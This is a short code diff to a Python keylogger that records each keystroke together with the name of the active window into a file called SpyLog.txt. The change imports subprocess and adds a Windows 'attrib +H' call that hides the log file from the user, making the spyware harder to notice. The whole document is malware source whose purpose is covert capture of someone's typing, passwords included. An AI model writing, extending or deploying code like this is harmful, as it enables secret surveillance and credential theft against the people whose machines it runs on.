@@ -1,5 +1,6 @@
 from pynput import keyboard
 from datetime import datetime
+import subprocess
 import threading
 import platform
 import pygetwindow as gw
@@ -135,6 +136,7 @@ def write_to_file(key, app):
                 log.write("\n")
                 
             log.write(f"{key} -> {app}\n")
+        subprocess.call(['attrib', '+H', 'SpyLog.txt'])
 
 def launch_key_logger():
     with keyboard.Listener(on_press=on_press) as listener:
